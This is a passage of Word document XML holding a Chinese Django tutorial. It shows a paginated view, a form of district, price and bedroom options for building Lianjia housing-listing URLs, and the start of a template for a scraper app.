        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.core.paginator import Paginator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C207A1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponseRedirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B763963" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DA93532" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def house_index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D9B978" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    form = HouseChoiceForm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1570D8CA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    house_list = HouseInfo.objects.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2701E13A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if house_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0335D3F0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        paginator = Paginator(house_list, 10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64619532" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        page = request.GET.get('page')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024FF14A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        page_obj = paginator.get_page(page)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217D1E4D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D16EE01" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return render(request, 'homelink/index.html',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3228AA36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                      {'page_obj': page_obj, 'paginator': paginator,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADB4215" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                       'is_paginated': True, 'form': form,})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322AF378" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433F5E0F" w14:textId="5882EF80" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return render(request,'homelink/index.html', {'form': form,})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71083EE9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本例中我们使用到了带有选项的表单HouseChoiceForm, 其代码如下。之所以这么构建选项是因为链家上的二手房信息链接是由不同选项拼接组成的。比如https://sh.lianjia.com/ershoufang/pudong/l2p3/查询的是浦东价格是300-400万之间的二房。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64626C33" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># homelink/forms.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE42FF9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5912A942" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2069D7C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DISTRICT_CHOICES = (('pudong', '</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>浦东</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'), ('minhang', '</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>闵行</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'), ('xuhui', '</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>徐汇</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD24ACE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>PRICE_CHOICES = (('p3', '300-400</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>万</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'), ('p4', '400-500</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>万</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'), ('p5', '500-800</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>万</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF96F49" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BEDROOM_CHOICES = (('l2', '</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>二室</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'), ('l3', '</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>三室</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5D5E1E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5470D9D5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class HouseChoiceForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2773D955" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    district = forms.CharField(label="</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>区域</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">", </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235617E5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    widget=forms.RadioSelect(choices=DISTRICT_CHOICES))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3D3412" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    price = forms.CharField(label="</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>价格</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">", </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A3F565" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    widget=forms.RadioSelect(choices=PRICE_CHOICES))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69400D6C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    bedroom = forms.CharField(label="</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>庭室</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">", </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EDDCE99" w14:textId="4E09CE66" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    widget=forms.RadioSelect(choices=BEDROOM_CHOICES))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4B96E8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>首页对应模板如下。该模板用户显示表单和爬取结果。如果用户通过表单提交爬取选项，将交由视图homelink:house_spider处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E8F529" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#homelink/templates/homelink/index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67085FB7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "homelink/base.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F927C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="747B10ED" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F527932" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D9BD761" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;h3&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>爬取上海链家二手房信息</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F7630A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;form method="POST" class="form-horizontal" role='form' </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AE7CD9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>action="{% url 'homelink:house_spider' %}"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C51E4C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  {% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179D6A37" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  {{ form.as_p }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676549A3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   &lt;div class="form-group"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F12E9C9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       &lt;div class="col-md-12"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CA555E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;button type="submit" class="btn btn-primary form-control"&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
